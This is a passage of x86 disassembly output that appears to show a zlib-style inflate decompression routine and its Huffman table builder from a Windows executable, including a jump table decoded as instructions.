  4064b5:	89 46 08             	mov    %eax,0x8(%esi)
  4064b8:	c7 06 06 00 00 00    	movl   $0x6,(%esi)
  4064be:	e9 59 03 00 00       	jmp    0x40681c
  4064c3:	f6 c1 10             	test   $0x10,%cl
  4064c6:	74 18                	je     0x4064e0
  4064c8:	83 e1 0f             	and    $0xf,%ecx
  4064cb:	89 4e 08             	mov    %ecx,0x8(%esi)
  4064ce:	0f b7 40 02          	movzwl 0x2(%eax),%eax
  4064d2:	89 46 04             	mov    %eax,0x4(%esi)
  4064d5:	c7 06 02 00 00 00    	movl   $0x2,(%esi)
  4064db:	e9 3c 03 00 00       	jmp    0x40681c
  4064e0:	f6 c1 40             	test   $0x40,%cl
  4064e3:	0f 84 d1 00 00 00    	je     0x4065ba
  4064e9:	f6 c1 20             	test   $0x20,%cl
  4064ec:	0f 84 cd f9 ff ff    	je     0x405ebf
  4064f2:	c7 06 07 00 00 00    	movl   $0x7,(%esi)
  4064f8:	e9 1f 03 00 00       	jmp    0x40681c
  4064fd:	8b 46 08             	mov    0x8(%esi),%eax
  406500:	eb 20                	jmp    0x406522
  406502:	83 7d cc 00          	cmpl   $0x0,-0x34(%ebp)
  406506:	0f 84 20 03 00 00    	je     0x40682c
  40650c:	8b 4d c8             	mov    -0x38(%ebp),%ecx
  40650f:	ff 4d cc             	decl   -0x34(%ebp)
  406512:	0f b6 11             	movzbl (%ecx),%edx
  406515:	8b cb                	mov    %ebx,%ecx
  406517:	d3 e2                	shl    %cl,%edx
  406519:	09 55 c0             	or     %edx,-0x40(%ebp)
  40651c:	ff 45 c8             	incl   -0x38(%ebp)
  40651f:	83 c3 08             	add    $0x8,%ebx
  406522:	3b d8                	cmp    %eax,%ebx
  406524:	72 dc                	jb     0x406502
  406526:	0f b7 0c 45 48 93 40 	movzwl 0x409348(,%eax,2),%ecx
  40652d:	00 
  40652e:	23 4d c0             	and    -0x40(%ebp),%ecx
  406531:	01 4e 04             	add    %ecx,0x4(%esi)
  406534:	8b c8                	mov    %eax,%ecx
  406536:	d3 6d c0             	shrl   %cl,-0x40(%ebp)
  406539:	2b d8                	sub    %eax,%ebx
  40653b:	0f b6 46 11          	movzbl 0x11(%esi),%eax
  40653f:	89 46 0c             	mov    %eax,0xc(%esi)
  406542:	8b 46 18             	mov    0x18(%esi),%eax
  406545:	89 46 08             	mov    %eax,0x8(%esi)
  406548:	c7 06 03 00 00 00    	movl   $0x3,(%esi)
  40654e:	8b 46 0c             	mov    0xc(%esi),%eax
  406551:	eb 20                	jmp    0x406573
  406553:	83 7d cc 00          	cmpl   $0x0,-0x34(%ebp)
  406557:	0f 84 cf 02 00 00    	je     0x40682c
  40655d:	8b 4d c8             	mov    -0x38(%ebp),%ecx
  406560:	ff 4d cc             	decl   -0x34(%ebp)
  406563:	0f b6 11             	movzbl (%ecx),%edx
  406566:	8b cb                	mov    %ebx,%ecx
  406568:	d3 e2                	shl    %cl,%edx
  40656a:	09 55 c0             	or     %edx,-0x40(%ebp)
  40656d:	ff 45 c8             	incl   -0x38(%ebp)
  406570:	83 c3 08             	add    $0x8,%ebx
  406573:	3b d8                	cmp    %eax,%ebx
  406575:	72 dc                	jb     0x406553
  406577:	0f b7 04 45 48 93 40 	movzwl 0x409348(,%eax,2),%eax
  40657e:	00 
  40657f:	23 45 c0             	and    -0x40(%ebp),%eax
  406582:	8b 4e 08             	mov    0x8(%esi),%ecx
  406585:	8d 04 81             	lea    (%ecx,%eax,4),%eax
  406588:	0f b6 48 01          	movzbl 0x1(%eax),%ecx
  40658c:	d3 6d c0             	shrl   %cl,-0x40(%ebp)
  40658f:	2b d9                	sub    %ecx,%ebx
  406591:	0f b6 08             	movzbl (%eax),%ecx
  406594:	f6 c1 10             	test   $0x10,%cl
  406597:	74 18                	je     0x4065b1
  406599:	83 e1 0f             	and    $0xf,%ecx
  40659c:	89 4e 08             	mov    %ecx,0x8(%esi)
  40659f:	0f b7 40 02          	movzwl 0x2(%eax),%eax
  4065a3:	89 46 0c             	mov    %eax,0xc(%esi)
  4065a6:	c7 06 04 00 00 00    	movl   $0x4,(%esi)
  4065ac:	e9 6b 02 00 00       	jmp    0x40681c
  4065b1:	f6 c1 40             	test   $0x40,%cl
  4065b4:	0f 85 05 f9 ff ff    	jne    0x405ebf
  4065ba:	89 4e 0c             	mov    %ecx,0xc(%esi)
  4065bd:	0f b7 48 02          	movzwl 0x2(%eax),%ecx
  4065c1:	8d 04 88             	lea    (%eax,%ecx,4),%eax
  4065c4:	89 46 08             	mov    %eax,0x8(%esi)
  4065c7:	e9 50 02 00 00       	jmp    0x40681c
  4065cc:	8b 46 08             	mov    0x8(%esi),%eax
  4065cf:	eb 20                	jmp    0x4065f1
  4065d1:	83 7d cc 00          	cmpl   $0x0,-0x34(%ebp)
  4065d5:	0f 84 51 02 00 00    	je     0x40682c
  4065db:	8b 4d c8             	mov    -0x38(%ebp),%ecx
  4065de:	ff 4d cc             	decl   -0x34(%ebp)
  4065e1:	0f b6 11             	movzbl (%ecx),%edx
  4065e4:	8b cb                	mov    %ebx,%ecx
  4065e6:	d3 e2                	shl    %cl,%edx
  4065e8:	09 55 c0             	or     %edx,-0x40(%ebp)
  4065eb:	ff 45 c8             	incl   -0x38(%ebp)
  4065ee:	83 c3 08             	add    $0x8,%ebx
  4065f1:	3b d8                	cmp    %eax,%ebx
  4065f3:	72 dc                	jb     0x4065d1
  4065f5:	0f b7 0c 45 48 93 40 	movzwl 0x409348(,%eax,2),%ecx
  4065fc:	00 
  4065fd:	23 4d c0             	and    -0x40(%ebp),%ecx
  406600:	01 4e 0c             	add    %ecx,0xc(%esi)
  406603:	8b c8                	mov    %eax,%ecx
  406605:	d3 6d c0             	shrl   %cl,-0x40(%ebp)
  406608:	2b d8                	sub    %eax,%ebx
  40660a:	c7 06 05 00 00 00    	movl   $0x5,(%esi)
  406610:	8b 45 d0             	mov    -0x30(%ebp),%eax
  406613:	8b 56 0c             	mov    0xc(%esi),%edx
  406616:	8b c8                	mov    %eax,%ecx
  406618:	2b ce                	sub    %esi,%ecx
  40661a:	81 e9 a0 1b 00 00    	sub    $0x1ba0,%ecx
  406620:	3b ca                	cmp    %edx,%ecx
  406622:	73 13                	jae    0x406637
  406624:	8b 8e a0 9b 00 00    	mov    0x9ba0(%esi),%ecx
  40662a:	2b ca                	sub    %edx,%ecx
  40662c:	2b ce                	sub    %esi,%ecx
  40662e:	8d 8c 01 60 e4 ff ff 	lea    -0x1ba0(%ecx,%eax,1),%ecx
  406635:	eb 04                	jmp    0x40663b
  406637:	8b c8                	mov    %eax,%ecx
  406639:	2b ca                	sub    %edx,%ecx
  40663b:	83 7e 04 00          	cmpl   $0x0,0x4(%esi)
  40663f:	89 4d e0             	mov    %ecx,-0x20(%ebp)
  406642:	0f 84 90 f9 ff ff    	je     0x405fd8
  406648:	8b 7d d4             	mov    -0x2c(%ebp),%edi
  40664b:	85 ff                	test   %edi,%edi
  40664d:	0f 85 91 00 00 00    	jne    0x4066e4
  406653:	8b be a0 9b 00 00    	mov    0x9ba0(%esi),%edi
  406659:	3b c7                	cmp    %edi,%eax
  40665b:	75 23                	jne    0x406680
  40665d:	8b 8e a4 9b 00 00    	mov    0x9ba4(%esi),%ecx
  406663:	8d 96 a0 1b 00 00    	lea    0x1ba0(%esi),%edx
  406669:	3b ca                	cmp    %edx,%ecx
  40666b:	74 13                	je     0x406680
  40666d:	8b c2                	mov    %edx,%eax
  40666f:	3b c1                	cmp    %ecx,%eax
  406671:	73 07                	jae    0x40667a
  406673:	2b c8                	sub    %eax,%ecx
  406675:	49                   	dec    %ecx
  406676:	8b f9                	mov    %ecx,%edi
  406678:	eb 02                	jmp    0x40667c
  40667a:	2b f8                	sub    %eax,%edi
  40667c:	85 ff                	test   %edi,%edi
  40667e:	75 64                	jne    0x4066e4
  406680:	ff 75 08             	push   0x8(%ebp)
  406683:	89 86 a8 9b 00 00    	mov    %eax,0x9ba8(%esi)
  406689:	e8 09 02 00 00       	call   0x406897
  40668e:	8b 86 a8 9b 00 00    	mov    0x9ba8(%esi),%eax
  406694:	8b 8e a4 9b 00 00    	mov    0x9ba4(%esi),%ecx
  40669a:	3b c1                	cmp    %ecx,%eax
  40669c:	89 45 d0             	mov    %eax,-0x30(%ebp)
  40669f:	73 07                	jae    0x4066a8
  4066a1:	8b f9                	mov    %ecx,%edi
  4066a3:	2b f8                	sub    %eax,%edi
  4066a5:	4f                   	dec    %edi
  4066a6:	eb 08                	jmp    0x4066b0
  4066a8:	8b be a0 9b 00 00    	mov    0x9ba0(%esi),%edi
  4066ae:	2b f8                	sub    %eax,%edi
  4066b0:	8b 96 a0 9b 00 00    	mov    0x9ba0(%esi),%edx
  4066b6:	3b c2                	cmp    %edx,%eax
  4066b8:	89 55 f8             	mov    %edx,-0x8(%ebp)
  4066bb:	75 1f                	jne    0x4066dc
  4066bd:	8d 96 a0 1b 00 00    	lea    0x1ba0(%esi),%edx
  4066c3:	3b ca                	cmp    %edx,%ecx
  4066c5:	74 15                	je     0x4066dc
  4066c7:	8b c2                	mov    %edx,%eax
  4066c9:	3b c1                	cmp    %ecx,%eax
  4066cb:	89 45 d0             	mov    %eax,-0x30(%ebp)
  4066ce:	73 07                	jae    0x4066d7
  4066d0:	2b c8                	sub    %eax,%ecx
  4066d2:	49                   	dec    %ecx
  4066d3:	8b f9                	mov    %ecx,%edi
  4066d5:	eb 05                	jmp    0x4066dc
  4066d7:	8b 7d f8             	mov    -0x8(%ebp),%edi
  4066da:	2b f8                	sub    %eax,%edi
  4066dc:	85 ff                	test   %edi,%edi
  4066de:	0f 84 64 01 00 00    	je     0x406848
  4066e4:	8b 4d e0             	mov    -0x20(%ebp),%ecx
  4066e7:	8a 11                	mov    (%ecx),%dl
  4066e9:	88 10                	mov    %dl,(%eax)
  4066eb:	40                   	inc    %eax
  4066ec:	41                   	inc    %ecx
  4066ed:	4f                   	dec    %edi
  4066ee:	3b 8e a0 9b 00 00    	cmp    0x9ba0(%esi),%ecx
  4066f4:	89 45 d0             	mov    %eax,-0x30(%ebp)
  4066f7:	89 4d e0             	mov    %ecx,-0x20(%ebp)
  4066fa:	89 7d d4             	mov    %edi,-0x2c(%ebp)
  4066fd:	75 09                	jne    0x406708
  4066ff:	8d 8e a0 1b 00 00    	lea    0x1ba0(%esi),%ecx
  406705:	89 4d e0             	mov    %ecx,-0x20(%ebp)
  406708:	ff 4e 04             	decl   0x4(%esi)
  40670b:	0f 85 3a ff ff ff    	jne    0x40664b
  406711:	e9 c2 f8 ff ff       	jmp    0x405fd8
  406716:	8b 45 d4             	mov    -0x2c(%ebp),%eax
  406719:	8b 7d d0             	mov    -0x30(%ebp),%edi
  40671c:	85 c0                	test   %eax,%eax
  40671e:	0f 85 91 00 00 00    	jne    0x4067b5
  406724:	8b 8e a0 9b 00 00    	mov    0x9ba0(%esi),%ecx
  40672a:	3b f9                	cmp    %ecx,%edi
  40672c:	75 23                	jne    0x406751
  40672e:	8b 86 a4 9b 00 00    	mov    0x9ba4(%esi),%eax
  406734:	8d 96 a0 1b 00 00    	lea    0x1ba0(%esi),%edx
  40673a:	3b c2                	cmp    %edx,%eax
  40673c:	74 13                	je     0x406751
  40673e:	8b fa                	mov    %edx,%edi
  406740:	3b f8                	cmp    %eax,%edi
  406742:	73 05                	jae    0x406749
  406744:	2b c7                	sub    %edi,%eax
  406746:	48                   	dec    %eax
  406747:	eb 04                	jmp    0x40674d
  406749:	2b cf                	sub    %edi,%ecx
  40674b:	8b c1                	mov    %ecx,%eax
  40674d:	85 c0                	test   %eax,%eax
  40674f:	75 64                	jne    0x4067b5
  406751:	ff 75 08             	push   0x8(%ebp)
  406754:	89 be a8 9b 00 00    	mov    %edi,0x9ba8(%esi)
  40675a:	e8 38 01 00 00       	call   0x406897
  40675f:	8b be a8 9b 00 00    	mov    0x9ba8(%esi),%edi
  406765:	8b 8e a4 9b 00 00    	mov    0x9ba4(%esi),%ecx
  40676b:	3b f9                	cmp    %ecx,%edi
  40676d:	89 7d d0             	mov    %edi,-0x30(%ebp)
  406770:	73 07                	jae    0x406779
  406772:	8b c1                	mov    %ecx,%eax
  406774:	2b c7                	sub    %edi,%eax
  406776:	48                   	dec    %eax
  406777:	eb 08                	jmp    0x406781
  406779:	8b 86 a0 9b 00 00    	mov    0x9ba0(%esi),%eax
  40677f:	2b c7                	sub    %edi,%eax
  406781:	8b 96 a0 9b 00 00    	mov    0x9ba0(%esi),%edx
  406787:	3b fa                	cmp    %edx,%edi
  406789:	89 55 f8             	mov    %edx,-0x8(%ebp)
  40678c:	75 1f                	jne    0x4067ad
  40678e:	8d 96 a0 1b 00 00    	lea    0x1ba0(%esi),%edx
  406794:	3b ca                	cmp    %edx,%ecx
  406796:	74 15                	je     0x4067ad
  406798:	8b fa                	mov    %edx,%edi
  40679a:	3b f9                	cmp    %ecx,%edi
  40679c:	89 7d d0             	mov    %edi,-0x30(%ebp)
  40679f:	73 07                	jae    0x4067a8
  4067a1:	2b cf                	sub    %edi,%ecx
  4067a3:	49                   	dec    %ecx
  4067a4:	8b c1                	mov    %ecx,%eax
  4067a6:	eb 05                	jmp    0x4067ad
  4067a8:	8b 45 f8             	mov    -0x8(%ebp),%eax
  4067ab:	2b c7                	sub    %edi,%eax
  4067ad:	85 c0                	test   %eax,%eax
  4067af:	0f 84 93 00 00 00    	je     0x406848
  4067b5:	8a 4e 08             	mov    0x8(%esi),%cl
  4067b8:	88 0f                	mov    %cl,(%edi)
  4067ba:	47                   	inc    %edi
  4067bb:	48                   	dec    %eax
  4067bc:	89 7d d0             	mov    %edi,-0x30(%ebp)
  4067bf:	89 45 d4             	mov    %eax,-0x2c(%ebp)
  4067c2:	e9 11 f8 ff ff       	jmp    0x405fd8
  4067c7:	83 fb 07             	cmp    $0x7,%ebx
  4067ca:	76 09                	jbe    0x4067d5
  4067cc:	83 eb 08             	sub    $0x8,%ebx
  4067cf:	ff 45 cc             	incl   -0x34(%ebp)
  4067d2:	ff 4d c8             	decl   -0x38(%ebp)
  4067d5:	8b 45 d0             	mov    -0x30(%ebp),%eax
  4067d8:	ff 75 08             	push   0x8(%ebp)
  4067db:	89 86 a8 9b 00 00    	mov    %eax,0x9ba8(%esi)
  4067e1:	e8 b1 00 00 00       	call   0x406897
  4067e6:	8b 8e a8 9b 00 00    	mov    0x9ba8(%esi),%ecx
  4067ec:	8b 96 a4 9b 00 00    	mov    0x9ba4(%esi),%edx
  4067f2:	3b ca                	cmp    %edx,%ecx
  4067f4:	89 4d d0             	mov    %ecx,-0x30(%ebp)
  4067f7:	73 07                	jae    0x406800
  4067f9:	8b c2                	mov    %edx,%eax
  4067fb:	2b c1                	sub    %ecx,%eax
  4067fd:	48                   	dec    %eax
  4067fe:	eb 08                	jmp    0x406808
  406800:	8b 86 a0 9b 00 00    	mov    0x9ba0(%esi),%eax
  406806:	2b c1                	sub    %ecx,%eax
  406808:	3b ca                	cmp    %edx,%ecx
  40680a:	89 45 d4             	mov    %eax,-0x2c(%ebp)
  40680d:	75 39                	jne    0x406848
  40680f:	8b 86 14 05 00 00    	mov    0x514(%esi),%eax
  406815:	83 f8 08             	cmp    $0x8,%eax
  406818:	89 06                	mov    %eax,(%esi)
  40681a:	75 33                	jne    0x40684f
  40681c:	8b 06                	mov    (%esi),%eax
  40681e:	83 f8 0f             	cmp    $0xf,%eax
  406821:	0f 86 32 f6 ff ff    	jbe    0x405e59
  406827:	e9 93 f6 ff ff       	jmp    0x405ebf
  40682c:	8b 45 c0             	mov    -0x40(%ebp),%eax
  40682f:	33 ff                	xor    %edi,%edi
  406831:	89 86 1c 05 00 00    	mov    %eax,0x51c(%esi)
  406837:	8b 45 08             	mov    0x8(%ebp),%eax
  40683a:	89 9e 18 05 00 00    	mov    %ebx,0x518(%esi)
  406840:	89 78 04             	mov    %edi,0x4(%eax)
  406843:	e9 98 f6 ff ff       	jmp    0x405ee0
  406848:	33 ff                	xor    %edi,%edi
  40684a:	e9 79 f6 ff ff       	jmp    0x405ec8
  40684f:	33 ff                	xor    %edi,%edi
  406851:	47                   	inc    %edi
  406852:	e9 71 f6 ff ff       	jmp    0x405ec8
  406857:	54                   	push   %esp
  406858:	64 40                	fs inc %eax
  40685a:	00 67 64             	add    %ah,0x64(%edi)
  40685d:	40                   	inc    %eax
  40685e:	00 fd                	add    %bh,%ch
  406860:	64 40                	fs inc %eax
  406862:	00 4e 65             	add    %cl,0x65(%esi)
  406865:	40                   	inc    %eax
  406866:	00 cc                	add    %cl,%ah
  406868:	65 40                	gs inc %eax
  40686a:	00 10                	add    %dl,(%eax)
  40686c:	66 40                	inc    %ax
  40686e:	00 16                	add    %dl,(%esi)
  406870:	67 40                	addr16 inc %eax
  406872:	00 c7                	add    %al,%bh
  406874:	67 40                	addr16 inc %eax
  406876:	00 80 5e 40 00 15    	add    %al,0x1500405e(%eax)
  40687c:	60                   	pusha
  40687d:	40                   	inc    %eax
  40687e:	00 3a                	add    %bh,(%edx)
  406880:	60                   	pusha
  406881:	40                   	inc    %eax
  406882:	00 48 61             	add    %cl,0x61(%eax)
  406885:	40                   	inc    %eax
  406886:	00 87 61 40 00 6a    	add    %al,0x6a004061(%edi)
  40688c:	63 40 00             	arpl   %eax,0x0(%eax)
  40688f:	bf 5e 40 00 d5       	mov    $0xd500405e,%edi
  406894:	67 40                	addr16 inc %eax
  406896:	00 53 56             	add    %dl,0x56(%ebx)
  406899:	8b 74 24 0c          	mov    0xc(%esp),%esi
  40689d:	57                   	push   %edi
  40689e:	8b be b4 9b 00 00    	mov    0x9bb4(%esi),%edi
  4068a4:	8b 9e b8 9b 00 00    	mov    0x9bb8(%esi),%ebx
  4068aa:	3b fb                	cmp    %ebx,%edi
  4068ac:	76 06                	jbe    0x4068b4
  4068ae:	8b 9e b0 9b 00 00    	mov    0x9bb0(%esi),%ebx
  4068b4:	8b 46 0c             	mov    0xc(%esi),%eax
  4068b7:	2b df                	sub    %edi,%ebx
  4068b9:	3b d8                	cmp    %eax,%ebx
  4068bb:	72 02                	jb     0x4068bf
  4068bd:	8b d8                	mov    %eax,%ebx
  4068bf:	53                   	push   %ebx
  4068c0:	57                   	push   %edi
  4068c1:	ff 76 08             	push   0x8(%esi)
  4068c4:	2b c3                	sub    %ebx,%eax
  4068c6:	89 46 0c             	mov    %eax,0xc(%esi)
  4068c9:	e8 d6 ed ff ff       	call   0x4056a4
  4068ce:	01 5e 08             	add    %ebx,0x8(%esi)
  4068d1:	8b 86 b0 9b 00 00    	mov    0x9bb0(%esi),%eax
  4068d7:	03 fb                	add    %ebx,%edi
  4068d9:	3b f8                	cmp    %eax,%edi
  4068db:	75 16                	jne    0x4068f3
  4068dd:	39 86 b8 9b 00 00    	cmp    %eax,0x9bb8(%esi)
  4068e3:	8d be b0 1b 00 00    	lea    0x1bb0(%esi),%edi
  4068e9:	75 b9                	jne    0x4068a4
  4068eb:	89 be b8 9b 00 00    	mov    %edi,0x9bb8(%esi)
  4068f1:	eb b1                	jmp    0x4068a4
  4068f3:	89 be b4 9b 00 00    	mov    %edi,0x9bb4(%esi)
  4068f9:	5f                   	pop    %edi
  4068fa:	5e                   	pop    %esi
  4068fb:	5b                   	pop    %ebx
  4068fc:	c2 04 00             	ret    $0x4
  4068ff:	55                   	push   %ebp
  406900:	8b ec                	mov    %esp,%ebp
  406902:	81 ec ec 00 00 00    	sub    $0xec,%esp
  406908:	53                   	push   %ebx
  406909:	56                   	push   %esi
  40690a:	8b 75 0c             	mov    0xc(%ebp),%esi
  40690d:	57                   	push   %edi
  40690e:	6a 10                	push   $0x10
  406910:	33 c0                	xor    %eax,%eax
  406912:	59                   	pop    %ecx
  406913:	8d 7d 90             	lea    -0x70(%ebp),%edi
  406916:	f3 ab                	rep stos %eax,%es:(%edi)
  406918:	8b 4d 08             	mov    0x8(%ebp),%ecx
  40691b:	8b d6                	mov    %esi,%edx
  40691d:	8b 01                	mov    (%ecx),%eax
  40691f:	83 c1 04             	add    $0x4,%ecx
  406922:	8d 44 85 90          	lea    -0x70(%ebp,%eax,4),%eax
  406926:	ff 00                	incl   (%eax)
  406928:	4a                   	dec    %edx
  406929:	75 f2                	jne    0x40691d
  40692b:	39 75 90             	cmp    %esi,-0x70(%ebp)
  40692e:	75 13                	jne    0x406943
  406930:	8b 45 1c             	mov    0x1c(%ebp),%eax
  406933:	83 20 00             	andl   $0x0,(%eax)
  406936:	8b 45 20             	mov    0x20(%ebp),%eax
  406939:	83 20 00             	andl   $0x0,(%eax)
  40693c:	33 c0                	xor    %eax,%eax
  40693e:	e9 f0 02 00 00       	jmp    0x406c33
  406943:	8b 75 20             	mov    0x20(%ebp),%esi
  406946:	33 db                	xor    %ebx,%ebx
  406948:	43                   	inc    %ebx
  406949:	6a 0f                	push   $0xf
  40694b:	8b 3e                	mov    (%esi),%edi
  40694d:	8b cb                	mov    %ebx,%ecx
  40694f:	89 7d 20             	mov    %edi,0x20(%ebp)
  406952:	5a                   	pop    %edx
  406953:	33 c0                	xor    %eax,%eax
  406955:	39 44 8d 90          	cmp    %eax,-0x70(%ebp,%ecx,4)
  406959:	75 05                	jne    0x406960
  40695b:	41                   	inc    %ecx
  40695c:	3b ca                	cmp    %edx,%ecx
  40695e:	76 f3                	jbe    0x406953
  406960:	3b f9                	cmp    %ecx,%edi
  406962:	89 4d fc             	mov    %ecx,-0x4(%ebp)
  406965:	73 03                	jae    0x40696a
  406967:	89 4d 20             	mov    %ecx,0x20(%ebp)
  40696a:	39 44 95 90          	cmp    %eax,-0x70(%ebp,%edx,4)
  40696e:	75 03                	jne    0x406973
  406970:	4a                   	dec    %edx
  406971:	75 f7                	jne    0x40696a
  406973:	39 55 20             	cmp    %edx,0x20(%ebp)
  406976:	89 55 e8             	mov    %edx,-0x18(%ebp)
  406979:	76 03                	jbe    0x40697e
  40697b:	89 55 20             	mov    %edx,0x20(%ebp)
  40697e:	8b 7d 20             	mov    0x20(%ebp),%edi
  406981:	89 3e                	mov    %edi,(%esi)
  406983:	d3 e3                	shl    %cl,%ebx
  406985:	eb 0d                	jmp    0x406994
  406987:	2b 5c 8d 90          	sub    -0x70(%ebp,%ecx,4),%ebx
  40698b:	0f 88 9f 02 00 00    	js     0x406c30
  406991:	41                   	inc    %ecx
  406992:	03 db                	add    %ebx,%ebx
  406994:	3b ca                	cmp    %edx,%ecx
  406996:	72 ef                	jb     0x406987
  406998:	8b f2                	mov    %edx,%esi
  40699a:	c1 e6 02             	shl    $0x2,%esi
  40699d:	8d 4c 35 90          	lea    -0x70(%ebp,%esi,1),%ecx
  4069a1:	8b 39                	mov    (%ecx),%edi
  4069a3:	2b df                	sub    %edi,%ebx
  4069a5:	89 5d d0             	mov    %ebx,-0x30(%ebp)
  4069a8:	0f 88 82 02 00 00    	js     0x406c30
  4069ae:	03 fb                	add    %ebx,%edi
  4069b0:	89 85 54 ff ff ff    	mov    %eax,-0xac(%ebp)
  4069b6:	89 39                	mov    %edi,(%ecx)
  4069b8:	33 c9                	xor    %ecx,%ecx
  4069ba:	4a                   	dec    %edx
  4069bb:	74 13                	je     0x4069d0
  4069bd:	33 ff                	xor    %edi,%edi
  4069bf:	03 4c 3d 94          	add    -0x6c(%ebp,%edi,1),%ecx
  4069c3:	83 c7 04             	add    $0x4,%edi
  4069c6:	4a                   	dec    %edx
  4069c7:	89 8c 3d 54 ff ff ff 	mov    %ecx,-0xac(%ebp,%edi,1)
  4069ce:	75 ef                	jne    0x4069bf
  4069d0:	8b 5d 08             	mov    0x8(%ebp),%ebx
  4069d3:	33 ff                	xor    %edi,%edi
  4069d5:	8b 0b                	mov    (%ebx),%ecx
  4069d7:	83 c3 04             	add    $0x4,%ebx
  4069da:	3b c8                	cmp    %eax,%ecx
  4069dc:	74 13                	je     0x4069f1
  4069de:	8d 8c 8d 50 ff ff ff 	lea    -0xb0(%ebp,%ecx,4),%ecx
  4069e5:	8b 11                	mov    (%ecx),%edx
  4069e7:	89 3c 95 f8 8d 44 00 	mov    %edi,0x448df8(,%edx,4)
  4069ee:	42                   	inc    %edx
  4069ef:	89 11                	mov    %edx,(%ecx)
  4069f1:	47                   	inc    %edi
  4069f2:	3b 7d 0c             	cmp    0xc(%ebp),%edi
  4069f5:	72 de                	jb     0x4069d5
  4069f7:	8b 8c 35 50 ff ff ff 	mov    -0xb0(%ebp,%esi,1),%ecx
  4069fe:	8b 5d 20             	mov    0x20(%ebp),%ebx
  406a01:	83 4d f4 ff          	orl    $0xffffffff,-0xc(%ebp)
  406a05:	83 65 dc 00          	andl   $0x0,-0x24(%ebp)
  406a09:	89 4d 0c             	mov    %ecx,0xc(%ebp)
  406a0c:	8b 4d fc             	mov    -0x4(%ebp),%ecx
  406a0f:	f7 db                	neg    %ebx
  406a11:	3b 4d e8             	cmp    -0x18(%ebp),%ecx
  406a14:	89 45 f8             	mov    %eax,-0x8(%ebp)
  406a17:	89 85 50 ff ff ff    	mov    %eax,-0xb0(%ebp)
  406a1d:	c7 45 e0 f8 8d 44 00 	movl   $0x448df8,-0x20(%ebp)
  406a24:	89 85 14 ff ff ff    	mov    %eax,-0xec(%ebp)
  406a2a:	0f 8f f3 01 00 00    	jg     0x406c23
  406a30:	8d 51 ff             	lea    -0x1(%ecx),%edx
  406a33:	8d 4c 8d 90          	lea    -0x70(%ebp,%ecx,4),%ecx
  406a37:	89 55 d8             	mov    %edx,-0x28(%ebp)
  406a3a:	89 4d e4             	mov    %ecx,-0x1c(%ebp)
  406a3d:	8b 4d e4             	mov    -0x1c(%ebp),%ecx
  406a40:	8b 31                	mov    (%ecx),%esi
  406a42:	85 f6                	test   %esi,%esi
  406a44:	0f 84 c3 01 00 00    	je     0x406c0d
  406a4a:	eb 03                	jmp    0x406a4f
  406a4c:	8b 75 d4             	mov    -0x2c(%ebp),%esi
  406a4f:	8b 4d 20             	mov    0x20(%ebp),%ecx
  406a52:	4e                   	dec    %esi
  406a53:	03 cb                	add    %ebx,%ecx
  406a55:	89 75 d4             	mov    %esi,-0x2c(%ebp)
  406a58:	39 4d fc             	cmp    %ecx,-0x4(%ebp)
  406a5b:	89 4d ec             	mov    %ecx,-0x14(%ebp)
  406a5e:	0f 8e cc 00 00 00    	jle    0x406b30
  406a64:	46                   	inc    %esi
  406a65:	89 75 f0             	mov    %esi,-0x10(%ebp)
  406a68:	8b 75 e8             	mov    -0x18(%ebp),%esi
  406a6b:	ff 45 f4             	incl   -0xc(%ebp)
  406a6e:	2b 75 ec             	sub    -0x14(%ebp),%esi
  406a71:	3b 75 20             	cmp    0x20(%ebp),%esi
  406a74:	76 03                	jbe    0x406a79
  406a76:	8b 75 20             	mov    0x20(%ebp),%esi
  406a79:	8b 4d fc             	mov    -0x4(%ebp),%ecx
  406a7c:	33 d2                	xor    %edx,%edx
  406a7e:	2b 4d ec             	sub    -0x14(%ebp),%ecx
  406a81:	42                   	inc    %edx
  406a82:	d3 e2                	shl    %cl,%edx
  406a84:	3b 55 f0             	cmp    -0x10(%ebp),%edx
  406a87:	76 23                	jbe    0x406aac
  406a89:	8b 7d e4             	mov    -0x1c(%ebp),%edi
  406a8c:	83 c8 ff             	or     $0xffffffff,%eax
  406a8f:	2b 45 d4             	sub    -0x2c(%ebp),%eax
  406a92:	03 d0                	add    %eax,%edx
  406a94:	3b ce                	cmp    %esi,%ecx
  406a96:	73 14                	jae    0x406aac
  406a98:	eb 0d                	jmp    0x406aa7
  406a9a:	83 c7 04             	add    $0x4,%edi
  406a9d:	03 d2                	add    %edx,%edx
  406a9f:	8b 07                	mov    (%edi),%eax
  406aa1:	3b d0                	cmp    %eax,%edx
  406aa3:	76 07                	jbe    0x406aac
  406aa5:	2b d0                	sub    %eax,%edx
  406aa7:	41                   	inc    %ecx
  406aa8:	3b ce                	cmp    %esi,%ecx
  406aaa:	72 ee                	jb     0x406a9a
  406aac:	8b 55 28             	mov    0x28(%ebp),%edx
  406aaf:	33 c0                	xor    %eax,%eax
  406ab1:	40                   	inc    %eax
  406ab2:	8b 12                	mov    (%edx),%edx
  406ab4:	d3 e0                	shl    %cl,%eax
  406ab6:	89 45 dc             	mov    %eax,-0x24(%ebp)
  406ab9:	8d 3c 02             	lea    (%edx,%eax,1),%edi
  406abc:	81 ff a0 05 00 00    	cmp    $0x5a0,%edi
  406ac2:	0f 87 68 01 00 00    	ja     0x406c30
  406ac8:	8b 45 24             	mov    0x24(%ebp),%eax
  406acb:	8d 04 90             	lea    (%eax,%edx,4),%eax
  406ace:	8b 55 f4             	mov    -0xc(%ebp),%edx
  406ad1:	8d b4 95 14 ff ff ff 	lea    -0xec(%ebp,%edx,4),%esi
  406ad8:	8b 55 28             	mov    0x28(%ebp),%edx
  406adb:	89 3a                	mov    %edi,(%edx)
  406add:	8b 55 f4             	mov    -0xc(%ebp),%edx
  406ae0:	85 d2                	test   %edx,%edx
  406ae2:	89 06                	mov    %eax,(%esi)
  406ae4:	74 31                	je     0x406b17
  406ae6:	8b 7d f8             	mov    -0x8(%ebp),%edi
  406ae9:	8b 76 fc             	mov    -0x4(%esi),%esi
  406aec:	89 bc 95 50 ff ff ff 	mov    %edi,-0xb0(%ebp,%edx,4)
  406af3:	8a 55 20             	mov    0x20(%ebp),%dl
  406af6:	88 55 09             	mov    %dl,0x9(%ebp)
  406af9:	88 4d 08             	mov    %cl,0x8(%ebp)
  406afc:	8b d7                	mov    %edi,%edx
  406afe:	8b cb                	mov    %ebx,%ecx
  406b00:	d3 ea                	shr    %cl,%edx
  406b02:	8b c8                	mov    %eax,%ecx
  406b04:	2b ce                	sub    %esi,%ecx
  406b06:	c1 f9 02             	sar    $0x2,%ecx
  406b09:	2b ca                	sub    %edx,%ecx
  406b0b:	66 89 4d 0a          	mov    %cx,0xa(%ebp)
